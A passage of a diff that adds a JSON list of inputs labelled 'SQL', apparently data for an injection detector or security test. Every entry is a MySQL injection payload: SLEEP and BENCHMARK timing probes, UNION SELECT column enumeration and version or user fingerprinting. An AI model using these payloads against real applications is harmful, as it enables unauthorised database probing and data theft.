+        "inputField": "ORDER BY 1,SLEEP(5),3,4--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),3",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),4",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),\"'3",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),\"'3'\"#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),4#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT USER()--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT SLEEP(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT USER(),SLEEP(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
